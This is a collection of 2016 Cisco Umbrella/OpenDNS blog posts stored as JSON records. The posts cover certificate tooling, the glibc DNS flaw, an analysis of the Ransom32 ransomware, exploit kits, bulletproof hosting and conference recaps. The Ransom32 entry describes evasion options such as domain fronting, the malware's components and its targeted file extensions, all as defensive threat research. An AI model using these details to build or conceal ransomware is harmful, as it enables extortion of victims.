{"website": "Cisco-Umbrella", "title": "DigiCert CA Plugin for Lemur", "author": ["Chris Dorros"], "link": "https://umbrella.cisco.com/blog/digicert-ca-plugin-for-lemur", "abstract": "Today the OpenDNS engineering team is releasing a DigiCert Issuer Plugin for Netflix’s recently released Lemur TLS certificate management tool . Motivation Anyone who’s had to create, distribute, and manage SSL/TLS certificates can tell you how much of a pain it can be. It often involves many manual steps, which are both time consuming and highly error-prone. This is roughly how creating and requesting a TLS certificate used to look like for developers at OpenDNS: Generate private key and CSR locally Upload the CSR via CA’s web GUI portal Get request approved Download the certificate Install the certificate on web server Realize the certificate wasn’t in the proper format Re-install certificate (2 years later) Forget how to do the above and repeat at step 1 There is no reason each developer needs to waste countless hours weeding through an unscalable, manual process like this. Thus, when we set out to fix this issue, we fell in love with Netflix’s Lemur . What we Built Lemur came with Verisign support out of the box, but we use DigiCert around here. Fortunately, the authors of Lemur had enough foresight to build a plugin framework, which means we can easily share our DigiCert plugin for Lemur! Now our process looks something like this: Login to Lemur web GUI Fill out form with certificate details (CN, validity period, etc) and hit request Private key and CSR are magically created behind the scenes. Lemur interacts with CA’s API to request and retrieve certificate. Transfer key and cert materials to secrets management service Keys and certificates are deployed to server via secrets management service How to Get it Head over to the GitHub page for instructions on setting it up and generating reports. Contributions definitely welcome! Feel free to fork & feature requests! Hope you find it useful.", "date": "2016-02-12"},
{"website": "Cisco-Umbrella", "title": "Our response to the glibc vulnerability: OpenDNS has your back", "author": ["Brian Hartvigsen"], "link": "https://umbrella.cisco.com/blog/2980-2", "abstract": "CVE-2015-7547 was publicly released by Google yesterday and many people are wondering how it impacts them. We’ve seen many conversations like the one between @SwiftOnSecurity and @davidu , our founder: @SwiftOnSecurity @MalwareTechBlog Not likely. Should be truncated or thrown out. We strive to avoid TCP for many reasons, this being one. — ☁ David Ulevitch ☁ (@davidu) February 16, 2016 The good news is that if you are using OpenDNS, you aren’t affected. If you want the technical details of why, please read on as we dive a little into how we process a DNS response. — To start off with, OpenDNS and our DNS software, opendnscache, do not rely on glibc for name resolution. This system library provides the underlying functionality expected of many programs, including name resolution via the getaddrinfo function. Instead these calls are normally leveraged by the software talking to OpenDNS to get an answer. So it is up to us to make sure that maliciously crafted responses are blocked before they reach you. In the case of this exploit we do this by carefully reading the packet off the wire. The first step of this is getting the correct size for the packet. For UDP packets we do this using a `recv()` call that will only accept up to the buffer size we allocate. For TCP connections, we read 2 bytes, `malloc()` a buffer according to that size, then copy that number of bytes onto the new buffer. No swaps between stack & heap are done; opendnscache itself is safe. That makes sure we have the right buffer size from the get go, but what prevents us from passing this garbage packet on to the end user? opendnscache does a number of validity checks on every packet. It checks to see if a packet attempts to overflow its size in every operation we do. If any malformed data is detected, we simply drop the packet; it never goes into our cache. We also don’t store raw packets. We parse the answers and store only those records. The trailing junk on the exploited packet make reading in the packets the most dangerous portion. So if the packet managed to be well-formed, opendnscache would cache only the valid answers, not the junk at the end of the packet. Based on the initial reading of the report from Google and our own tests, opendnscache rejects these responses as malformed.", "date": "2016-02-17"},
{"website": "Cisco-Umbrella", "title": "The Return of Ransom32", "author": ["Artsiom Holub"], "link": "https://umbrella.cisco.com/blog/return-of-ransom32-new-redesigned-version", "abstract": "The Ransom32’s Origin If you keep an eye on ransomware threats or the RaaS (ransomware as a service) market, you most likely have already heard about Ransom32, the first JavaScript ransomware. Emisoft provides a good description of the first version of it here and Malwarebytes gives some implementation details of the malicious package here . At first glance this particular threat doesn’t look scary at all. You have to find a way to deliver a malware file larger than 22 MB malware, whereas most ransomware variants rarely exceed 1 MB in size. I needed a piece of malware to analyze for a malware analysis class I started recently, I decided to use Ransom32. After some time spent to locate the .onion site in the Tor network, and to register a Bitcoin wallet, I finally got to the client download section. At this point, I noticed that the client menu had new options: Bundle Tor client – The author offers to include the tor client in the package, which looks less suspicious for AV. This increases package size by 1.3 MB. The first version had a built-in Tor client by default. Bundle pluggable transport – This spoofs the connection so it seems to be connecting to a public Clearnet. The option increases the client size by 1.2 MB. Relay server – This offers a package that will have server and client side, which makes it a lot easier to deliver and monetize. The client has the smallest size of all options. The victim will download ransomware from the server that you need to set up. The downside is obvious: you have to set up a server somewhere else with a 24/7 runtime. What’s Inside I have two versions of the client. The first one has “Bundle pluggable transport” enabled. The second one is a default version. The difference in package size is significant. The very first client was about 22 MB. The current are 1.06 MB and 3.31 MB. This indicates that the ransomware author listens to his customers. Decreasing the size and redesigning the package makes it a lot easier to use for malicious purposes. The main part of the unpacked content consists of the following files: The client with the enabled “Bundle pluggable transport” feature has two extra DLLs, that are responsible for its functionality. This feature is an implementation of meek , which is an obfuscation layer for Tor designed to evade Internet censorship. Traffic is relayed through a third-party server that is hard to block, a ​ CDN for example. It uses a trick called ​ domain fronting to communicate with a Tor relay while appearing to talk to another domain. The rest of the files within the archive have the following purposes: dotNetFx40_Full_setup.exe – The Microsoft .NET Framework 4 web installer package downloads and installs the .NET Framework components required to run on the target machine architecture and OS. So apparently this ransomware requires .NET framework 4 for normal functionality. This also means that without an Internet connection, encryption could not be performed. However, it’s not a legit version of the framework, but a repacked one. It modifies regular functions and supports ransomware operations. The original name: Boxstub.exe[SHA1:06BECADB92A5FCCA2529C0B93687C2A0C6D0D610]. It has been seen in different malware packages . StartMenu.dll – contains data that are required by the NW.js framework to function properly. Tozpac.exe – is a packaged NW.js application and contains the actual malware code, as well as the framework required to run the malware. It implements the entire process of encrypting files, as well as handles all of the network negotiations. Tozpac.exe.config – contains the malware’s configuration information. Encryption Process Before encrypting your data, Ransom32 will first launch dotNetFx40_Full_setup.exe. Afterward, it triggers Tozpac.exe, which will encrypt them using AES encryption. One thing that I noticed is Tozpac.exe imports mscoree.dll to do the encryption. And this means that most of the functionality that was built-in before, is now imported using Windows DLLs: For example, to initiate Remote Procedure Call it’s using rpcrt4.dll. For encryption, it’s using crypt32.dll. Using some dynamic analysis tricks we were able to find the attack extensions: aaf, .accdb, .aep, .aet, .ai, .aif, .as, .as3, .asf, .asp, .asx, .avi, .bbrksave, .bejeweled2deluxesavedgame, .blasterball3savedgame, .bmp, .c, .chesstitanssave-ms, .chuzzledeluxesavedgame, .civ4savedgame, .civ4worldbuildersave, .class, .comfycakessave-ms, .cpp, .cs, .csv, .dat, .db, .dbf, .ddpokersave, .dinerdashsavedgame, .dna.xml,.doc, .docm, .docx, .dot, .dotm, .dotx, .dplsave, .dsasave, .dsqsave, .dssave, .dwg, .dxf, .efx, .egwarsave, .emlx, .eps, .fatesavedgame, .fla, .flv, .freecellsave-ms, .game, .games, . gif, .h, .heartssave-ms, .iff, .indd, .inx, .jar, .java, .jpeg, .jpg, .lssave, .m3u, .m3u8, .m4u, .mahjongtitanssave-ms,.max, .mdb, .mid, .minesweepersave-ms, .mov, .mp3, .mp4, .mpa, .mpeg, .mpg, .msg, .3dm, .3g2, .3gp, .pdb, .pdf, .php, .plb, .pmd, .png, .pot, .potm, .potx, .ppam, .ppj, .pps, .ppsm, .ppsx, .ppt, .pptm, .pptx, .prel, .prproj, .ps, .psd, .pspautosave, .purblepairssave-ms, .purbleshopsave-ms, .ra, .raw, .rb, .rtf, .sacred2save, .sav, .savage, .save, .savedgame, .savedsearch, .saver, .savgao, .savings, .sdf, .ses, .sgsav, .solitairesave-ms, .spidersolitairesave-ms, .spv, .sql, .sv5, .svg, .swf, .thewitchersave, .tif, .txt, .vcf, .vob, .wagame, .wav, .wma, .wmv, .wpd, .wps, .wsave, .xla, .xlam, .xll, .xlm, .xls, .xlsb, .xlsm, .xlsx, .xlt, .xltm, .xltx, .xlw, .xml Once it has finished encrypting your data, it will display the Ransom32 ransom lock screen/ransom note as shown below. Obfuscation via Node.js It has been two months since I first saw Ransom32. At that time, it looked like the malware author cared mostly about the ability to imitate legitimate applications for the purpose of avoiding detection. However, as we can see, even the RaaS market is competitive. And as such, it seems to have forced the Ransom32 author to redesign his product.  Before, there were a number of various elements, including legitimate applications: i.e., the Tor client (renamed to rundll32.exe) and the size of the file was huge. Now, most of the functionality is embedded into one file that is only ~1MB in size. The technology that was chosen for the core — Node.js — has let the malware stay undetected by most AV products months after its first appearance. What makes the Ransom32 RaaS so scary, is that using a platform like NW.js brings us closer to the malware that could be easily run on Macs and Linux operating systems as they do on Windows. Although there does not seem to be any indication that this is being done as of yet, doing so would be trivial. We will keep monitoring Ransom32 to see how RaaS affects the ransomware market.", "date": "2016-02-18"},
{"website": "Cisco-Umbrella", "title": "From Kaspersky SAS to RSA 2016", "author": ["Dhia Mahjoub"], "link": "https://umbrella.cisco.com/blog/kaspersky-sas-2016-recap", "abstract": "Three weeks ago, OpenDNS Research Labs was at the annual Kaspersky Security Analyst Summit held in Tenerife, Spain, February 7 to 11. Thomas Mathew and I were delighted to talk about “Defeating malware with signal analysis techniques” on the 9th. SAS is one of my favorite security conferences of the year because it combines great quality talks, a very tech-savvy yet jolly crowd, and highly entertaining activities. We had the chance to catch up with friends from the community and meet with our friends from the Talos research team. As a matter of fact, we are pleased to invite Nick Biasini from Talos to contribute to this blog. SAS first day was at the Magma Art & Congress Center, Tenerife [Nick Biasini]. Sunset view from the hotel [Alisha Anderson]. After the 2 days conference, we had a full day of entertainment organized by Kaspersky for all attendees. We took a trip to Teide National Park, a must-see wonder in Tenerife. At 3,700 m, this is the highest peak on Spanish soil and it is regarded as the world’s third-tallest volcanic structure. The views were breathtaking and otherworldly. We also visited the Teide Observatory which is an astronomical observatory on Mount Teide operated by the Instituto de Astrofísica de Canarias. Several technicians at the observatory gave us a tour of several world-class telescopes financed by various European countries for advanced astronomical projects. Teide Observatory is known for its great astronomical seeing conditions. Las Cañadas volcanic cauldron in Tenerife [Nick Biasini]. Sunset view on the way down from El Teide [Alisha Anderson]. Insights from Dhia Mahjoub There were numerous quality talks at SAS, and it’s hard to go over all of them here. A nice appearance was that of Reuben Paul as a keynote speaker. He demonstrated live attacks and delivered inspiring words, from his 9-year-old perspective, on teaching kids to be curious and enthusiastic about security. I was pleased to meet Reuben’s family afterwards . With friends Reuben and Mano Paul [Mano Paul]. In “Poseidon’s APT boutique” Kaspersky researchers unveiled the first Portuguese-speaking targeted attack group, named “Poseidon.” The group is more likely a commercial threat player and appears to have been active since at least 2005. Poseidon’s campaigns were particularly tailored towards the MS Windows family, and heavily focused on espionage for commercial interests with at least 35 enumerated victims including companies in energy and utilities, telecommunications, public relations, media, financial institutions, governmental institutions, services in general and manufacturing. These victims are mostly in Brazil, USA, France, Kazakhstan, United Arab Emirates, India, and Russia. Poseidon used spear phishing as the main infection vector packaged with embedded, executable elements inside office documents with the executables often digitally signed to avoid detection or blocking. After the infection, the malware reports to CnC servers, then starts a lateral movement phase. This phase will often leverage a specialized tool that automatically collects a variety of information including credentials, group management policies, or system logs to better adapt further attacks. The information exfiltrated is then leveraged by a company front to blackmail victim companies into contracting the Poseidon Group as a security firm under the threat of exchanging the stolen information with competitors. This extortion component of this campaign is what differentiates the Poseidon group from others. It is also noteworthy that the group did not leverage zero-day vulnerabilities in the samples analyzed. Poseidon focused primarily on conventional means to deceive users with executables posing inside office documents, and actual poisoned documents with malicious macro-scripts has been the sole method used for compromising their desired targets. Finally, it seems this group managed to stay under the radar because many of its campaigns were designed to run on specific machines with diverse CnC servers located in different countries that are swiftly discarded. Insights from Thomas Mathew Thomas Rid, professor at Imperial College London and author of Rise of the War Machines, gave an excellent talk about the Moonlight Maze APT group. The talk was part detective story and part historical overview. Many security practitioners are familiar with APT groups that have been named in the last five years by companies like Kaspersky and Mandiant. Information about older APT groups has been more rare. What made the talk interesting were the details about an APT group that had been around in the 1990s. Through a painstaking investigation involving multiple Freedom of Information Act requests to obtain first hand government documents and interviews with personnel involved with the case. Rid was able to piece together how a suspected Russian APT group was able to enter classified US networks and exfiltrate data. The group ‘Moonlight Maze’ used universities with close connections to government run programs as entry points to into the government networks. This gave them the ability to not only obtain sensitive material but also run jobs on US supercomputers. Ultimately the discovery of the Moonlight Maze group led to a classified congressional hearing. Rid had to conduct many personal interviews to obtain information about the group because many of the original documents detailing the group’s MO were destroyed. Moonlight Maze also has a connection to the present. Parts of the Maze infrastructure were also used by the Turla group as they hacked satellites. In another talk, Sergey Golovanov and Vladislav Roskov of Kaspersky gave an update on the Carbanak group that Kaspersky discovered last year. This year the group exposed Metel/Corkow , another Trojan that infected a Russian bank and surreptitiously transferred money to criminals. By identifying flaws in the groups code, Kaspersky was able to identify servers involved in the money transfers. They accomplished this by scanning the entire IP space for servers that output a particular error string when asked a question. It was a cool demonstration of using network tools like scanning to help find malicious servers. Insights from Nick Biasini A couple weeks ago I was given the opportunity to present at Kaspersky’s Security Analyst Summit.  The topic was Bedep, a favorite payload of Angler, and associated threats.  This was a continuation to the previous work on Angler by Talos. It was my first SAS experience and I thoroughly enjoyed spending time in Tenerife. The venue was excellent, including the accommodations and the conference tracks.  In particular, I enjoyed the duration of the talks. The 20-30 minute window provided time for technical details, without a lot of excess information. This allowed for more talks, covering a diverse range of topics. Overall, I found SAS to be a good mixture of technical and high-level presentations with an emphasis on APT.  The conference opened with an interesting presentation from Reuben Paul, giving a glimpse into the future of information security. I really enjoyed the opportunity to meet up with colleagues and discuss threats, including Angler and Bedep. One takeaway from the presentations is how much crimeware is evolving. It’s clear that adversaries are becoming more sophisticated and have really progressed over the last handful of years. There were plenty of examples of crimeware carrying out operations and executing them effectively with substantial financial returns. See you at RSA 2016 Next Thursday, March 3 at 10:20am, OpenDNS Research Labs will be presenting at RSA on “Using Large Scale Data to Provide Attacker Attribution for Unknown IoCs”. Hope to see you there. [Photo Credits] We thank our friends Alisha Anderson @AlishaAndersonA , Nick Biasini @infosec_nick , and Mano Paul @manopaul for the photos used in this blog.", "date": "2016-02-26"},
{"website": "Cisco-Umbrella", "title": "Exploit Kits for All", "author": ["Andrea Kaiser"], "link": "https://umbrella.cisco.com/blog/exploit-kits-for-all", "abstract": "Cybercriminals have many different tactics to attempt to gain control of your computer or steal your personal information. One way is through exploit kits (EKs). Attackers write EKs to run on web applications to exploit specific vulnerabilities in software that can allow them to compromise your system. An EK can hide within a website’s code. To the visitor, it is invisible. Whether a vulnerability has been around for months or it is a zero-day exploit, the attacker is counting on you to put off updating that vulnerable web browser or plugin. They’re counting on you clicking “remind me later,” every time you’re prompted to install an update. Although it causes all sorts of security problems, “remind me later” really is a necessity. You don’t always want to update to the latest software version. Updating one software version sometimes breaks another piece of crucial software. So, you defer and continue pushing off the update until everything is compatible. Then there’s the inconvenience. Wait for an installation and then a reboot in the middle of a work day? Never. Gonna. Happen. The attackers know these systems are out there, unpatched against the latest vulnerabilities. How do attackers find a computer to exploit? Spam and phishing are a common strategy. You know when you receive that email with all of the empty promises of a bad infomercial? “Click here for singles in your area that want to meet you!” “Click here to lose weight instantly. The new mouse clicking exercise routine awaits!” Once you click a link from a phishing email, your browser is likely directed to a compromised website hosting an EK, ready to take advantage of your out-of-date browser or plugins. One of the most widely used EKs at the moment is Angler. Throughout 2015, Angler was seen to exploit mainly Flash, Internet Explorer, and Silverlight based Common Vulnerabilities and Exposures (CVEs) [1] . Phishing sites aren’t the only sources for exploit kits. It could be a seemingly innocuous website that you visit regularly, like your banking site. One technique used on compromised websites is to modify the website’s HTML code to load a malicious Flash file from yet another compromised site. Flash then issues the HTTP POST request. The response to POST will redirect the visitor to another website. When the landing page for the EK is reached, it will decide which exploit it can deploy based on browser and plugin information gathered from the visitor. The goal here is a drive-by download. If the computer is able to be exploited, the payload (malware) is downloaded. The payload is executed and post-infection communication to command and control (C&C) servers begins. Payloads vary; the most prevalent being ransomware variants and infostealers. Ransomware, such as Teslacrypt [2] , encrypts specific file types on your computer so that you are no longer able to access them and offers to decrypt them for you after receiving payment. TeslaCrypt callback traffic; compromised domains. A Trojan infostealer, such as Dridex [3] , is able to collect screenshots while you use your computer, grab information entered into forms from specific sites you visit, and redirect to false banking sites. Dridex XML configuration, showing which URLs to use to capture form submissions. Of course, the goal of exploitation isn’t always to steal your personal information. The aim could be to keep infecting more computers, leaving a backdoor for remote access communication and enlisting computers into a zombie botnet. Botnets are computers that can be issued commands from a C&C server and are used for spamming, or DDoS attacks. Let’s not forget the vigilantes. There are rumors of vigilante white/gray hats taking over the Dridex botnet to send out payloads of popular antivirus software. The AV cleans the machine of all known malware in its definitions and then releases control. The anti-malware-malware. To keep up to date on the latest CVEs, sign up with US-CERT to receive alerts on exploits and zero-days. Another good resource is the Offensive Security Exploit Database . Give the database a search before you add that new plugin to your WordPress site. Speaking of WordPress, the Exploit Database currently has 857 archived exploits regarding the publishing application. If you’re running WordPress, it’s imperative that you keep it up to date. The majority of the EKs that researchers find are hosted on compromised WordPress sites [4] . Be sure to always update your OS, web browsers, and plugins with the latest patches. You can use Umbrella , OpenDNS’s flagship enterprise security product and have access to a dashboard that provides centralized visibility and control over all of your organization’s offices and users, no matter where they operate. And with Investigate , you’re able to pivot through an attacker’s infrastructure to detect or respond to threats. [domain that OpenDNS has blocked for being associated with TeslaCrypt] Of course, you could always keep hoping for some of that anti-malware-malware to drop on your systems.", "date": "2016-03-02"},
{"website": "Cisco-Umbrella", "title": "Carpe Datum: OpenDNS Labs travels to Prague for Cisco CTA Data Science Summit", "author": ["Jeremiah O'Connor"], "link": "https://umbrella.cisco.com/blog/opendns-labs-travels-to-prague-for-cisco-cta-data-science-summit", "abstract": "This past February, OpenDNS Labs had the privilege of attending the Cisco Data Science Summit hosted by the Cisco Cognitive Threat Analytics team in Prague, Czech Republic. At the summit our team got to present some of the cool data science and data engineering research that we are working on at OpenDNS Labs. This was one of the more technical conferences we have attended, and there was a mix of very talented people from all different Cisco locations like San Jose, San Francisco, Baltimore, North Carolina, London, Canada, Prague, and more. Michal Sofka kicked off the summit with a talk about Representation Learning, explaining how there is a paradigm shift moving away from engineered features, and went on to mention one of our favorite quotes from the conference: “Unsupervised Learning is the future.” Tomas Pevny (pictured below) presented about using principles of steganography for malware protection, and how user behavior should be considered in a larger context. Blake Anderson (pictured below) and David McGrew, from Cisco’s San Jose office, presented some cutting-edge research about gaining visibility into encrypted traffic and detecting malware in TLS. At the end of day one, OpenDNS CTO Dan Hubbard gave a keynote talk on Investigate and the OpenGraphiti Visualization Tool which many people in the audience enjoyed: OpenDNS Labs researchers also gave a presentation on large-scale, real-time detection which we will also be presenting at Blackhat Asia later this month. Checkout a sneak peek of it here . All of the presentations were outstanding, and we really enjoyed some of the presentations on detection techniques. Martin Rehak gave a really great presentation about the future of the CTA team; about malware moving to HTTPS; the rise of Adware as a threat; and the necessity for global visibility to discover trends.  Jiri Havelka gave an innovative presentation on word-based DGA detection on anomalous traffic, and  Martin Grill and Ivan Nikolaev gave a very interesting presentation on detecting exploit kits, both of which had a lot of crossover with type of detection we do at OpenDNS. Abhijit Talathi and Jane Diao also gave a very nice presentation on spam fighting techniques at Cisco. Steve McKinney gave a great presentation on Cisco Big Data engineering and TIP which is the main data warehouse for Cisco. After the Conference we got a chance to do some awesome sightseeing in the beautiful city of Prague (below are some of pictures). At Old Town Square: On the St. Charles Bridge: The Bone Church, Kutná Hora: We also had the pleasure of meeting up with one of our greatly missed OpenDNS alumni for dinner and drinks, the infamous Zach Gilman: Overall it was a successful trip presenting about how OpenDNS performs scalable data science on 80 billion daily DNS queries. Big thanks to Cisco Cognitive Threat Analytics Team and Zach Gilman for the outstanding hospitality! Hopefully we will have another Data Science Summit to look forward to this summer. We miss Prague very much, especially the outstanding Czech beer!", "date": "2016-03-18"},
{"website": "Cisco-Umbrella", "title": "OpenDNS hack-a-thon: “Build Tomorrow”", "author": ["Jennifer Basalone"], "link": "https://umbrella.cisco.com/blog/opendns-hack-a-thon-build-tomorrow", "abstract": "Hack-a-thons have become an important part of OpenDNS and integral to our culture. Wrapping our first for 2016, I thought it would be nice to reflect on their importance. A few times a year our employees gather together for 24 hours of collaboration. Our team members get to work with other employees they may not typically work with and experiment on something totally new. OpenDNS uses agile methodologies to drive engineering and creativity. OpenDNS believes that the core of agile’s values is knowledge and experimentation. Hack-a-Thons generate bold experiments that many people may otherwise not try, and force people to step out of their comfort zones and really push themselves. Creating an environment that forces radical instinctive decisions and fast iterations helps spark creativity you normally don’t see. While many companies focus hack-a-thons toward their engineers, we like to think a bit bigger by encouraging every employee to participate. We believe this ensures that creativity is driven from all corners of our business. A key part to ensure success is removing the leaders from the process so that people can do what they believe is right based on the data they have. Simplifying the roles in the process cuts through much of people’s personal opinions and projections. Hack-a-thons give decision making power to the employees and empowers the participants to make things better. Hack-a-thons drive excitement and remind us what a group of motivated people can accomplish. During our last hack-a-thon, IT developed an interactive map to find conference rooms and our Office Manager in Vancouver designed a website to better share information about the office. Any employee is capable of changing a process, solving a business problem, or developing something that disrupts how we do things today. It’s more about training people to be makers and to change the landscape. Great products have previously surfaced from our Hack-a-thons. By sparking innovation and  disrupting norms, in 24 hours we can change our product roadmap completely. An excellent example was the prototype for what is now a core product, OpenDNS’s Investigate . Others have also followed like, BPGStream , our free Twitter alerting resource for BGP Hijacks and major outages. The impact can be huge but it can also be as simple changing the way we operate, directly benefiting our customers. There are several ways to host a hack-a-thon, but at OpenDNS, we are sold on the 24 hour time block. Instead of hacking over an extended period of time, where priorities shift and ideas can become distracted, you are pushed to deliver in a time window. OpenDNS supports our participants with good food, overnight packs, nap tents, swag and prizes. We involve everyone in the company to generate the excitement. Our Design Team developed all the media, from posters to the t-shirts, all in house. The office staff was vital in ensuring everyone had a fun, power generated environment to work in. You can find that some Hack-a-thons have themes to guide people towards a common goal. Generally we don’t use themes, as open-ended Hack-a-thons lend towards out of the box thinking. So we “theme” it based on a common ideal. This past hack-a-thon we focused on “Building Tomorrow”. At the end of the hack-a-thon, each team will demo the hack and present to anyone in the company who wants to attend. Even though hackers have been up for more than 24 hours, there is something invigorating about seeing your idea actually working. Software is typically so malleable that it is often hard for people to see your vision. This is one reason agile focuses on building the simplest thing, obtaining feedback, and quickly iterating. Everyone is encouraged to vote on ideas so we can see what the company is most excited about. We have a popular vote and a panel of judges who choose winners based on the technology used, the level of creativity and a winner that exceeds at both. Immediately afterwards, Product teams will huddle up and decide what should disrupt the roadmap today. Many engineers move their prototypes to implementation phase, if possible. Our last hack-a-thon saw 30 different teams. Within a month, almost 20% of the prototypes were implemented right away and 40% of these new ideas are being planned for implementation this year. Hack-a-thons enable ground-breaking ideas across the industry. From Facebook’s timeline and like button, to a new logo for the New York Times. All this comes from enabling people to be at their best. We look forward to shipping our latest ideas and what could come next from future hack-a-thons.", "date": "2016-04-27"},
{"website": "Cisco-Umbrella", "title": "New Integration with AnyConnect Offers Off-Network Protection Without New Agents", "author": ["Erin Kelly"], "link": "https://umbrella.cisco.com/blog/new-integration-anyconnect-offers-off-network-protection-without-new-agents-2", "abstract": "First, the not-necessarily-good news: 82% of workers admit to not always using the VPN – despite their organization’s “best practice” VPN policies By 2018, Gartner estimates that 25% of corporate data traffic will bypass perimeter security and flow directly from mobile devices to the cloud 49% of the workforce is mobile and under-defended While security may never stop 100% of the threats, it must work 100% of the time — most doesn’t Why is that not-necessarily-good news for your business? When users aren’t connected to the VPN, they’re not protected by perimeter security solutions such as next-generation firewall and secure Web gateway appliances. Similarly, the devices and data of users who work directly in the cloud using Office 365, SalesForce, DocuSign, or other industry-specific cloud apps are not always going to be protected by perimeter security appliances. The takeaway? Your firewall, proxy, and AV cannot adequately protect your mobile workforce. That leaves them (and your network) vulnerable to system compromise and data exfiltration. To address this challenge before, OpenDNS offered a Roaming Client that could be deployed on endpoints to forward DNS requests to our global network from anywhere (and it’s still available today). But now there’s great news: Umbrella now integrates with AnyConnect so you can protect users on and off the network with no new agents required. What does this great news mean for your business? If you need to protect employees when they’re off the corporate network and have the Cisco AnyConnect Secure Mobility Client currently deployed, new Umbrella integration protects users wherever they go just by leveraging what you already have in place. So you can safeguard increasingly mobile employees—whose work happens in the cloud, on personal laptops and other devices, and away from the network—against malware, phishing, command & control callbacks and other malicious activity. All with no additional agents to deploy, no end-user action required, and no performance sacrifice. The best news? By simply upgrading your AnyConnect client to v4.3 MR1 and enabling the Umbrella functionality, Umbrella seamlessly delivers always-on security without the hassle of always-on VPN, 100% of the time. Get a quick overview of this integration with Product Manager Adam Winn: And take a deeper dive with CTO Dan Hubbard:", "date": "2016-07-08"},
{"website": "Cisco-Umbrella", "title": "BSides Las Vegas and BlackHat USA Recap", "author": ["Andrea Kaiser"], "link": "https://umbrella.cisco.com/blog/bsides-las-vegas-blackhat-usa-recap", "abstract": "Earlier in August, a few of us from Security Research at OpenDNS left our hoodies behind in San Francisco to endure the 100+ degree blazing heat of Las Vegas, NV to attend BSides Las Vegas , and BlackHat USA . We look forward to this week every year to have the opportunity to share our research and network with the security community. We were able to attend many awesome talks and had the privilege of presenting as well. Here are some insights from our Research team. INSIGHTS FROM ANDREA SCARFO Andrea was particularly pleased to deliver her very first speaking engagement at a conference. At BSides Las Vegas, she presented “ An Evolving Era of Botnet Empires “. The talk highlighted the history of botnets, their evolving characteristics, and botnet detection methods using DNS traffic. Of all of the amazing talks at BSides, here are a few highlights from the talks that Andrea was able to attend: Ryan Chapman gave a really enjoyable interactive talk titled; “ Exposing Neutrino EK: All the Naughty Bits ”. Ryan made a point to highlight that the Exploit-Kit vulnerabilities are part of a business. The malware authors pay for their malware to be distributed by the Exploit-Kit authors. Someone gets paid to run the campaign to spread the exploit-kits and redirect the traffic. There’s also money to be made in setting up the infrastructure that is used to make all of this happen, for example, the redirects and the landing pages. He then had a really cool live display of reverse engineering the second stage .swf file involved in the Neutrino Exploit-Kit using FlashDevelop . Vineetha Paruchuri delivered “ QUESTIONING 42: Where is the “Engineering” in the Social Engineering of Namespace Compromises? ” A very lively and frank discussion about how frustratingly easy it is to social engineer your way into taking control over someone’s digital life, or gaining control over a domain. Some examples required only pure social engineering. While others were a mix of social engineering, workflow and protocol vulnerabilities or exploits combined. Companies that continue to value profit over customer privacy will make it incredibly easy to social engineer your way into someone’s personal account. The fact that OSINT is used to verify ownership of very important and private accounts is still mind boggling. Vineetha likened the human interactions involved in these social engineering cases to a client/server session. Putting some actual “engineering” into the social engineering problem could lead to a solution. One major take-away: 2FA all the things. INSIGHTS FROM THOMAS MATTHEW AND DHIA MAHJOUB Dhia and Thomas gave a talk at Blackhat 2016 with Mykhailo Sakaly from Intel471 . In their talk titled “Towards a Holistic Approach in Building Intelligence to Fight Crimeware” , they proposed an integrated approach to fight crimeware that combines both network-centric and actor-centric perspectives. Bulletproof hosting (BPH) providers represent a fundamental enabling technology to all sorts of cybercrime campaigns and they lend themselves to being explored from both perspectives. Cybercrime offerings In the first part of the talk, the speakers described the different classes of cybercrime offerings: products, services and goods. Products include malware (e.g. RATs, banking trojans), DDoS or brute-forcing tools and exploits and vulnerabilities. Services include bulletproof hosting, DDoS services, ransomware-as-a-service, exploit kits, cash out and exchangers. Goods represent commodities that are quickly consumable such as credit card and database dumps and PII. Bqhost is an example of a bulletproof hosting provider with a public web site. Intelligence sources for crimeware investigation Next, they described the data sources and processes used to construct the network and actor centric views. The network view uses data such as DNS, IP, BGP, Whois, SSL, malware samples, etc. The actor-centric view is built through access to closed underground forums and marketplaces, direct communication with criminal actors, and the purchasing of services to verify claimed features and map out infrastructures. crdclub.ws is a free registration credit card dump shop hosted on BPH. Bulletproof hosting classification taxonomy The speakers then proposed a BPH classification taxonomy: From the actor view, these hosters can be ranked in 3 tiers depending on their reputation, technical complexity and involvement in high profile cyber-criminal campaigns. From the network view, we identified key technical features that, when combined together, are distinctive of rogue hosting infrastructures. Some of the features are: -Leaf ASN (also known as stub ASN in networking terminology): an ASN with upstream but no downstream peers. -Business registration in offshore jurisdictions (e.g. Anguilla, Belize, Dominica, Seychelles, UAE, etc). -Hosting that is botnet-based or dedicated servers based. -Anonymous payment methods, e.g. bitcoin, Perfect Money. Dataflow.su is a bulletproof hosting provider operating leaf AS203624, with business registration in Belize and IP space in Ukraine, Russia. Bulletproof hosting use cases In the second part of the talk, Dhia and Mykhailo gave a detailed overview of various examples of BPH that are both botnet based (ZBot fast flux proxy network) and dedicated (Althost, Abdallah, Maxided, Dataflow.su, XServer, Offshore Racks) with the majority operating from Ukraine and Russia. They also talked about the evolution of these services over the past few years. Offshoreracks.com is an anonymous offshore hosting provider located in Panama and hosting phishing, stolen credit card shops, pharma, etc. Using SSL data at scale to track malware infrastructures The talk finally discussed the methods used in order to identify bulletproof hosting providers with SSL scan data as a key source. SSL data constitutes a valuable fingerprint in identifying similar hosting ranges. Therefore, we talked about how to build a database to store SSL data involving x509 certificates and SSL hashes. These two pieces of information can be used to identify a particular hoster based on searching through common-name records in the x509 certificate or scanning IP ranges for particular SSL hashes. Thomas described the database involved and the various engineering challenges we faced in order to make the system scalable. One notable problem was designing tables that were optimized for large scans. By tweaking our rowkey structure we were able to solve the issue. By combining SSL data with IP monitoring techniques, security researchers are able to better identify bulletproof hosters as well as predict new IP ranges where hosters might move their services to. Stay tuned for the release of the video of the talk.", "date": "2016-09-08"},
